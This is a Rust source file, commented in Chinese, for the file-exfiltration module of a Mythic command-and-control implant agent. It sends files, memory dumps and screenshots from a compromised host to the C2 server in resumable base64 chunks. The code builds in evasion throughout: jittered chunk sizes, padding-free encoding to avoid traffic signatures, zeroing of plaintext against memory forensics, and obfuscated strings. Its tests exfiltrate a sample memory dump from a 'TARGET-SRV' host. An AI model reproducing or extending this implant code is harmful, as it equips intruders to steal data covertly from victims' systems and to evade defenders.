//! # 外发传输与分片编排引擎 (Outbound Transfer Engine: Agent -> Mythic)
//!
//! ## 架构核心哲学与 100% 零堆纯栈契约 (Zero-Heap OPSEC Architecture)
//!
//! 1. **专注于 Mythic 4.0 纯字节偏移 (Byte-Offset) 协议**：
//!    - 彻底废除 Chunk 序号模式，严格基于 0-based 字节偏移量 (`chunk_offset`) 与总字节数 (`total_size`)；
//!    - 支持未知长度流式传输（负数 `total_size: -1`）与后续动态更新锁定；
//!    - 完整支持 `file_id / transfer_id` + `resume: true` 的标准断点续传握手机制。
//! 2. **通用多态数据输入源 ([`TransferSource`])**：
//!    - 无论传输物理文件（[`ZeroRead + ZeroSeek`]）还是纯内存切片（截图、转储、大任务回显），均统一调度。
//! 3. **纯栈工作区驱动 ([`ActiveStackWorkspace`])**：
//!    - 结合 [`ActiveBudget::jittered_raw_read`] 保证 3 字节倍数向下对齐，消除 Base64 尾部 `=` 填充特征；
//!    - 封包后立即通过 [`zeroize_slice`] volatile 物理刷零明文，防御进程内存转储取证。

use crate::buffer::{encode_to_slice, zeroize_slice};
pub use crate::error::FileTransferError;
use crate::protocol::{
    ActiveBudget, ActiveStackWorkspace, FileDownloadResponse, ServerTaskPostResponseItem,
    TaskResponseItem,
};
use crate::stream::{ZeroRead, ZeroSeek};
use crate::transfer::TransferSource;

// ==========================================
// 1. 传输前握手注册元数据 (Registration Meta)
// ==========================================

/// 传输前握手注册元数据 (Checkin/Registration Phase Meta)
///
/// 记录本次外发传输载荷的初始声明信息，用于首次向 Mythic 申请 `file_id`。
#[derive(Clone, Copy, PartialEq, Eq, Default)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct TransferRegisterMeta<'a> {
    /// 预估总字节数 (支持 -1 代表未知长度流式传输)
    pub total_size: i64,
    /// 显示文件名 (如 `Some("dump.bin")`，内存传输可传自定义虚拟名)
    pub filename: Option<&'a str>,
    /// 本地完整路径 (内存传输可传 `None`)
    pub full_path: Option<&'a str>,
    /// 宿主主机名称 (可选，默认由服务端根据回调推导)
    pub host: Option<&'a str>,
    /// 是否作为屏幕截图归档 (若为 true 则 Mythic 自动路由到专有截图查看器)
    pub is_screenshot: bool,
}

impl<'a> TransferRegisterMeta<'a> {
    /// 创建常规文件或内存数据注册元数据
    #[inline]
    pub const fn new(
        total_size: i64,
        filename: Option<&'a str>,
        full_path: Option<&'a str>,
    ) -> Self {
        Self {
            total_size,
            filename,
            full_path,
            host: None,
            is_screenshot: false,
        }
    }

    /// 标记为屏幕截图归档
    #[inline]
    pub const fn with_screenshot(mut self, is_screenshot: bool) -> Self {
        self.is_screenshot = is_screenshot;
        self
    }

    /// 标记来源主机名
    #[inline]
    pub const fn with_host(mut self, host: Option<&'a str>) -> Self {
        self.host = host;
        self
    }
}

// ==========================================
// 2. 通用外发传输会话状态机 (Outbound Transfer Session)
// ==========================================

/// 通用外发传输会话状态机 (100% 零堆纯栈紧凑布局，仅占约 56 字节)
///
/// 维护单次外发传输从“未注册 -> 握手就绪 -> 字节步进 -> 断点续传 -> 传输完成”的全生命周期。
#[derive(Clone, Copy, PartialEq, Eq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct TransferSession<'a> {
    /// 触发该外发的任务 UUID (借用)
    pub task_id: &'a str,
    /// Mythic 服务端分配的唯一凭证 UUID (首次注册握手成功后保存为定长 36 字节栈数组)
    pub transfer_id: Option<[u8; 36]>,
    /// 载荷物理总大小 (字节，支持负数如 -1 代表流式未知长度)
    pub total_size: i64,
    /// 当前已发送或服务端要求的起始字节偏移量 (0-based)
    pub current_offset: u64,
    /// 整个传输是否已完成
    pub is_complete: bool,
    /// 本次会话是否经过断点续传恢复
    pub is_resumed: bool,
}

impl<'a> TransferSession<'a> {
    /// 创建新的传输会话实例 (未注册握手状态)
    ///
    /// * `task_id`: 关联的 Mythic Task UUID
    /// * `total_size`: 载荷物理总字节数 (未知可传 -1)
    #[inline]
    pub const fn new(task_id: &'a str, total_size: i64) -> Self {
        Self {
            task_id,
            transfer_id: None,
            total_size,
            current_offset: 0,
            is_complete: total_size == 0,
            is_resumed: false,
        }
    }

    /// 使用已有定长 36 字节 transfer_id 创建会话 (用于从持久化记录或崩溃后恢复断点续传)
    #[inline]
    pub const fn new_with_transfer_id(
        task_id: &'a str,
        total_size: i64,
        transfer_id: [u8; 36],
        current_offset: u64,
    ) -> Self {
        Self {
            task_id,
            transfer_id: Some(transfer_id),
            total_size,
            current_offset,
            is_complete: total_size >= 0 && current_offset >= total_size as u64,
            is_resumed: true,
        }
    }

    /// 提取当前保存的 File/Transfer UUID 字符串切片 (零拷贝 UTF-8 视图)
    #[inline]
    pub fn transfer_id_str(&self) -> Option<&str> {
        self.transfer_id
            .as_ref()
            .and_then(|id| core::str::from_utf8(id).ok())
    }

    /// 动态更新数据总大小 (应对流式生成时最初为 -1，后续得出确定大小的场景)
    #[inline]
    pub fn update_total_size(&mut self, new_size: i64) {
        self.total_size = new_size;
        if new_size >= 0 && self.current_offset >= new_size as u64 {
            self.is_complete = true;
        }
    }

    /// 手动标记会话已传输完成 (适用于未知长度流式传输到达 EOF 的场景)
    #[inline]
    pub fn mark_complete(&mut self) {
        self.is_complete = true;
    }

    // ----------------- 阶段 1: 传输前注册握手 (Checkin / Registration) -----------------

    /// 构造首次向 Mythic 注册传输的请求载荷 (纯 Offset 模式)
    ///
    /// * 对应文档：/message-flow/file-download-agent-greater-than-mythic#register-an-offset-transfer
    #[inline]
    pub fn build_register_payload(&self, meta: TransferRegisterMeta<'a>) -> FileDownloadResponse<'a> {
        FileDownloadResponse::new_offset_register(
            meta.total_size,
            meta.filename,
            meta.full_path,
            meta.host,
            meta.is_screenshot,
        )
    }

    /// 一键构造包装好的注册顶层 TaskResponseItem
    #[inline]
    pub fn build_register_task_response(&self, meta: TransferRegisterMeta<'a>) -> TaskResponseItem<'a> {
        TaskResponseItem {
            task_id: self.task_id,
            download: Some(self.build_register_payload(meta)),
            ..TaskResponseItem::default()
        }
    }

    /// 处理服务端注册确认回执并将 File UUID 安全保存至栈数组 `[u8; 36]`
    ///
    /// 彻底切断对临时解密明文缓冲区的生命周期借用，杜绝堆分配与内存残留。
    pub fn handle_register_ack(
        &mut self,
        resp: &ServerTaskPostResponseItem<'_>,
    ) -> Result<&str, FileTransferError> {
        if resp.status != obfstr::obfstr!("success") {
            return Err(FileTransferError::ServerStatusError);
        }

        let id_str = resp.file_id.ok_or(FileTransferError::MissingFileId)?;
        let bytes = id_str.as_bytes();
        if bytes.len() != 36 {
            return Err(FileTransferError::MissingFileId);
        }

        let mut arr = [0u8; 36];
        arr.copy_from_slice(bytes);
        self.transfer_id = Some(arr);

        Ok(self.transfer_id_str().unwrap())
    }

    // ----------------- 阶段 2: 异常断点续传握手 (Resume Handshake) -----------------

    /// 构造断点续传 (Resume) 申请报文
    ///
    /// 发送已有 transfer_id + `resume: true` 向服务端询问缺失的首个字节偏移量。
    pub fn build_resume_payload(&self) -> Result<FileDownloadResponse<'_>, FileTransferError> {
        let file_id = self
            .transfer_id_str()
            .ok_or(FileTransferError::MissingFileId)?;
        Ok(FileDownloadResponse::new_resume_request(file_id))
    }

    /// 一键构造包装好的断点续传顶层 TaskResponseItem
    pub fn build_resume_task_response(&self) -> Result<TaskResponseItem<'_>, FileTransferError> {
        let req = self.build_resume_payload()?;
        Ok(TaskResponseItem {
            task_id: self.task_id,
            download: Some(req),
            ..TaskResponseItem::default()
        })
    }

    /// 解析服务端的断点续传确认回执，并校准当前字节读取偏移量 (纯 Offset 模式)
    ///
    /// * 校验服务端下发的 `chunk_offset`，防止越界错误。
    pub fn handle_resume_ack(
        &mut self,
        resp: &ServerTaskPostResponseItem<'_>,
    ) -> Result<u64, FileTransferError> {
        if resp.status != obfstr::obfstr!("success") {
            return Err(FileTransferError::ServerStatusError);
        }

        let new_offset = resp
            .chunk_offset
            .ok_or(FileTransferError::ServerMissingOffset)?;

        if self.total_size >= 0 && new_offset > self.total_size as u64 {
            return Err(FileTransferError::OffsetOutOfBounds);
        }

        self.current_offset = new_offset;
        self.is_resumed = true;
        if self.total_size >= 0 && self.current_offset >= self.total_size as u64 {
            self.is_complete = true;
        }

        Ok(self.current_offset)
    }

    // ----------------- 阶段 3: 纯栈数据流泵送 (Stream Pump Engine) -----------------

    /// 核心步进调度器：从多态数据源中提取分片并完成纯栈封包与擦除
    ///
    /// * `source`: 多态数据输入源 (支持 File 与 MemorySlice)
    /// * `workspace`: 调用者提供的纯栈工作区 ([`ActiveStackWorkspace`])，承载 raw_buf 与 b64_buf
    /// * `use_jitter`: 是否启用基于 [`ActiveBudget::jittered_raw_read`] 的动态抖动与 3 字节倍数向下对齐
    ///
    /// 返回 `(FileDownloadResponse, 实际读取消耗的原始字节数)`
    pub fn pump_next_chunk<'buf, 'sess, 'src, R>(
        &'sess mut self,
        source: &mut TransferSource<'src, R>,
        workspace: &'buf mut ActiveStackWorkspace,
        use_jitter: bool,
    ) -> Result<(FileDownloadResponse<'sess>, usize), FileTransferError>
    where
        R: ZeroRead + ZeroSeek,
        'buf: 'sess,
    {
        if self.is_complete {
            return Err(FileTransferError::InvalidState);
        }

        let file_id_bytes = self
            .transfer_id
            .as_ref()
            .ok_or(FileTransferError::MissingFileId)?;
        let file_id = core::str::from_utf8(file_id_bytes)
            .map_err(|_| FileTransferError::MissingFileId)?;

        // 1. 根据 PacketBudget 计算本次读取配额 (保证 3 字节倍数向下对齐，杜绝 Base64 '=' 填充)
        let max_budget = if use_jitter {
            ActiveBudget::jittered_raw_read()
        } else {
            ActiveBudget::MAX_RAW_READ
        };

        // 若总大小已知且非负，读取量不超过剩余未传字节数
        let target_len = if self.total_size >= 0 {
            let remaining_bytes = (self.total_size as u64).saturating_sub(self.current_offset);
            if remaining_bytes == 0 {
                self.is_complete = true;
                return Err(FileTransferError::InvalidState);
            }
            (max_budget as u64).min(remaining_bytes) as usize
        } else {
            max_budget
        };

        // 确保不超过 workspace.raw_buf 的物理容量 (MAX_RAW_LEN = 3072)
        let target_len = target_len.min(workspace.raw_buf.len());
        if target_len == 0 {
            return Err(FileTransferError::BufferTooSmall);
        }

        // 2. 统一从多态数据源根据 current_offset 读取至 workspace.raw_buf
        let read_bytes = match source {
            TransferSource::File(reader) => {
                reader.zero_seek_start(self.current_offset)?;
                reader.zero_read(&mut workspace.raw_buf[..target_len])?
            }
            TransferSource::MemorySlice(slice) => {
                let off = self.current_offset as usize;
                if off >= slice.len() {
                    0
                } else {
                    let available = &slice[off..];
                    let to_copy = target_len.min(available.len());
                    workspace.raw_buf[..to_copy].copy_from_slice(&available[..to_copy]);
                    to_copy
                }
            }
        };

        if read_bytes == 0 {
            // 到达 EOF 或数据源末尾
            self.is_complete = true;
            return Err(FileTransferError::InvalidState);
        }

        // 3. 原地 Base64 编码至 workspace.chunk_buf (与外层封包 b64_buf 严格解耦，零堆分配)
        let encoded_bytes = encode_to_slice(
            &workspace.raw_buf[..read_bytes],
            &mut workspace.chunk_buf,
        )
        .map_err(|_| FileTransferError::Base64Error)?;

        let b64_str = core::str::from_utf8(encoded_bytes)
            .map_err(|_| FileTransferError::Base64Error)?;

        // 4. 【OPSEC】物理擦除暂存的明文原始字节，防御进程内存转储取证
        zeroize_slice(&mut workspace.raw_buf[..read_bytes]);

        // 5. 组装纯 Offset 报文
        let chunk_resp =
            FileDownloadResponse::new_offset_chunk(file_id, self.current_offset, b64_str);

        // 6. 推进偏移量并检查传输完成状态
        self.current_offset = self.current_offset.saturating_add(read_bytes as u64);
        if self.total_size >= 0 && self.current_offset >= self.total_size as u64 {
            self.is_complete = true;
        }

        Ok((chunk_resp, read_bytes))
    }

    /// 便捷方法：从实现 `ZeroRead + ZeroSeek` 的流 (如文件句柄) 中读取分片并封包
    #[inline]
    pub fn pump_file_chunk<'buf, 'sess, R>(
        &'sess mut self,
        reader: &mut R,
        workspace: &'buf mut ActiveStackWorkspace,
        use_jitter: bool,
    ) -> Result<(FileDownloadResponse<'sess>, usize), FileTransferError>
    where
        R: ZeroRead + ZeroSeek,
        'buf: 'sess,
    {
        let mut source = TransferSource::File(reader);
        self.pump_next_chunk(&mut source, workspace, use_jitter)
    }

    /// 便捷方法：从内存切片借用中读取分片并封包 (如大回显、内存转储、截图切片)
    #[inline]
    pub fn pump_slice_chunk<'buf, 'sess>(
        &'sess mut self,
        slice: &[u8],
        workspace: &'buf mut ActiveStackWorkspace,
        use_jitter: bool,
    ) -> Result<(FileDownloadResponse<'sess>, usize), FileTransferError>
    where
        'buf: 'sess,
    {
        let mut source = TransferSource::slice(slice);
        self.pump_next_chunk(&mut source, workspace, use_jitter)
    }

    /// 处理服务端对发送切片的确认响应 (纯 Byte-Offset 偏移校准)
    pub fn handle_chunk_ack(
        &mut self,
        resp: &ServerTaskPostResponseItem<'_>,
    ) -> Result<u64, FileTransferError> {
        if resp.status != obfstr::obfstr!("success") {
            return Err(FileTransferError::ServerStatusError);
        }
        if let Some(offset) = resp.chunk_offset {
            self.current_offset = offset;
            if self.total_size >= 0 && self.current_offset >= self.total_size as u64 {
                self.is_complete = true;
            }
        }
        Ok(self.current_offset)
    }
}

// ==========================================
// 3. 单元测试
// ==========================================

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Cursor;

    #[test]
    fn test_transfer_session_lifecycle_and_resume() {
        let mut session = TransferSession::new("task-uuid-generic", 5000);
        assert_eq!(session.total_size, 5000);
        assert!(!session.is_complete);

        // 1. 验证首次注册报文
        let meta = TransferRegisterMeta::new(5000, Some("memdump.dmp"), None)
            .with_host(Some("TARGET-SRV"))
            .with_screenshot(false);

        let reg = session.build_register_payload(meta);
        assert_eq!(reg.total_size, Some(5000));
        assert_eq!(reg.filename, Some("memdump.dmp"));
        assert_eq!(reg.host, Some("TARGET-SRV"));
        assert!(reg.file_id.is_none());

        let task_resp = session.build_register_task_response(meta);
        assert_eq!(task_resp.task_id, "task-uuid-generic");
        assert!(task_resp.download.is_some());

        // 2. 模拟服务端返回注册成功回执 (36 字节 UUID)
        let sample_uuid = "11112222-3333-4444-5555-666677778888";
        let reg_ack = ServerTaskPostResponseItem {
            task_id: "task-uuid-generic",
            status: "success",
            file_id: Some(sample_uuid),
            ..Default::default()
        };
        let file_id = session.handle_register_ack(&reg_ack).unwrap();
        assert_eq!(file_id, sample_uuid);
        assert_eq!(session.transfer_id_str(), Some(sample_uuid));

        // 3. 模拟发送第一个切片
        let sample_raw = b"Generic stream test data payload";
        let mut workspace = ActiveStackWorkspace::new();
        {
            let (chunk_resp, sent_bytes) = session
                .pump_slice_chunk(sample_raw, &mut workspace, false)
                .unwrap();

            assert_eq!(sent_bytes, sample_raw.len());
            assert_eq!(chunk_resp.chunk_offset, Some(0));
            assert_eq!(chunk_resp.file_id, Some(sample_uuid));
        }
        assert_eq!(session.current_offset, sample_raw.len() as u64);
        assert!(!session.is_complete);

        // 4. 模拟网络中断，发起断点续传申请
        let resume_req = session.build_resume_payload().unwrap();
        assert_eq!(resume_req.file_id, Some(sample_uuid));
        assert_eq!(resume_req.resume, Some(true));

        // 5. 模拟服务端纯 Offset 回执 (告知从偏移量 2048 恢复)
        let resume_ack = ServerTaskPostResponseItem {
            task_id: "task-uuid-generic",
            status: "success",
            file_id: Some(sample_uuid),
            chunk_offset: Some(2048),
            transfer_type: Some("offset"),
            total_size: Some(5000),
            ..Default::default()
        };
        let resumed_offset = session.handle_resume_ack(&resume_ack).unwrap();
        assert_eq!(resumed_offset, 2048);
        assert_eq!(session.current_offset, 2048);
        assert!(session.is_resumed);
    }

    #[test]
    fn test_transfer_session_file_pump_with_jitter() {
        let mut fake_file_data = vec![0u8; 100_000];
        for (i, b) in fake_file_data.iter_mut().enumerate() {
            *b = (i % 256) as u8;
        }
        let total_size = fake_file_data.len() as i64;
        let mut cursor = Cursor::new(&mut fake_file_data[..]);

        let sample_uuid = "abcdef01-2345-6789-abcd-ef0123456789";
        let mut uuid_arr = [0u8; 36];
        uuid_arr.copy_from_slice(sample_uuid.as_bytes());

        let mut session =
            TransferSession::new_with_transfer_id("task-jitter", total_size, uuid_arr, 0);

        let mut workspace = ActiveStackWorkspace::new();

        // 第 1 轮分片读取 (开启 Jitter)
        let (chunk1, bytes1) = session
            .pump_file_chunk(&mut cursor, &mut workspace, true)
            .unwrap();
        assert_eq!(chunk1.chunk_offset, Some(0));
        assert!(bytes1 >= ActiveBudget::min_raw_read());
        assert_eq!(bytes1 % 3, 0); // 严格 3 字节倍数对齐
        assert_eq!(session.current_offset, bytes1 as u64);

        // 持续读取直至完成
        while !session.is_complete {
            let (chunk, read_len) = session
                .pump_file_chunk(&mut cursor, &mut workspace, true)
                .unwrap();
            assert!(read_len > 0);
            assert!(chunk.chunk_data.is_some());
            assert!(chunk.chunk_offset.is_some());
        }

        assert_eq!(session.current_offset, total_size as u64);
        assert!(session.is_complete);
    }

    #[test]
    fn test_transfer_session_streaming_and_update() {
        let mut session = TransferSession::new("task-stream", -1);
        assert_eq!(session.total_size, -1);
        assert!(!session.is_complete);

        let sample_uuid = "99999999-8888-7777-6666-555555555555";
        let mut uuid_arr = [0u8; 36];
        uuid_arr.copy_from_slice(sample_uuid.as_bytes());
        session.transfer_id = Some(uuid_arr);

        let chunk1_bytes = [0x55u8; 600];
        let mut workspace = ActiveStackWorkspace::new();
        let (resp1, sent1) = session
            .pump_slice_chunk(&chunk1_bytes, &mut workspace, false)
            .unwrap();
        assert_eq!(sent1, 600);
        assert_eq!(resp1.chunk_offset, Some(0));
        assert_eq!(session.current_offset, 600);
        assert!(!session.is_complete);

        // 流式传输完毕，动态更新并锁定总大小为 600
        session.update_total_size(600);
        assert!(session.is_complete);
    }
}
